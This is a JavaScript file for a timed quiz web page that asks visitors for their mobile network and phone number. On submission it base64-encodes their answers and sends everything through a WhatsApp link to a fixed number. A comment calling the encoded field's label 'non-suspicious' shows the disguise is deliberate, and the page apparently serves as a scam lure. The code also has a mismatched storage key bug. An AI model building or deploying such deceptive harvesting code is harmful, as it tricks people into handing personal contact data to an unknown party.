document.addEventListener('DOMContentLoaded', function () {
    const loader = document.getElementById('loader');
    const quizContainer = document.getElementById('quizContainer');
    const timerElement = document.getElementById('timer');
    
    // Display loader for 3 seconds before showing the form
    loader.classList.remove('hidden');
    setTimeout(() => {
        loader.classList.add('hidden');
        quizContainer.classList.remove('hidden');
        // Show the network modal first
        if (!localStorage.getItem('network') || !localStorage.getItem('phone')) {
            document.getElementById('networkModal').style.display = 'block';
        }
    }, 3000);

    // Check for previous participation
    if (localStorage.getItem('qizTaken')) {
        alert("You have already participated in the quiz. Please wait for the results.");
        showLoader(() => {
            window.location.href = 'app.html';
        });
    }

    // Timer functionality
    let timeLeft = 90;
    const timerInterval = setInterval(() => {
        timeLeft--;
        timerElement.textContent = `Time left: ${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            submitQuiz();
        }
    }, 1000);
});

function saveDetails() {
    const network = document.getElementById('network').value;
    const phone = document.getElementById('phone').value;
    if (network && phone) {
        localStorage.setItem('network', network);
        localStorage.setItem('phone', phone);
        document.getElementById('networkModal').style.display = 'none';
    } else {
        alert('Please fill in all the details.');
    }
}

function submitQuiz() {
    const quizForm = document.getElementById('quizForm');
    const formData = new FormData(quizForm);
    let responses = {};
    formData.forEach((value, key) => {
        responses[key] = value;
    });

    const encodedResponses = btoa(JSON.stringify(responses));
    const network = localStorage.getItem('network');
    const phone = localStorage.getItem('phone');
    const label = "User ID";  // Non-suspicious label

    const whatsappLink = `https://wa.me/2348146054930?text=Network: ${network}%0APhone: ${phone}%0A${label}: ${encodedResponses}`;
    localStorage.setItem('quizTaken', 'true');
    
    showLoader(() => {
        window.open(whatsappLink, '_blank');
        window.location.href = 'app.html';
    });
}

function showLoader(callback) {
    const loader = document.getElementById('loader');
    loader.classList.remove('hidden');
    setTimeout(() => {
        loader.classList.add('hidden');
        if (callback) callback();
    }, 3000);
}

function closeModal() {
    document.getElementById('networkModal').style.display = 'none';
}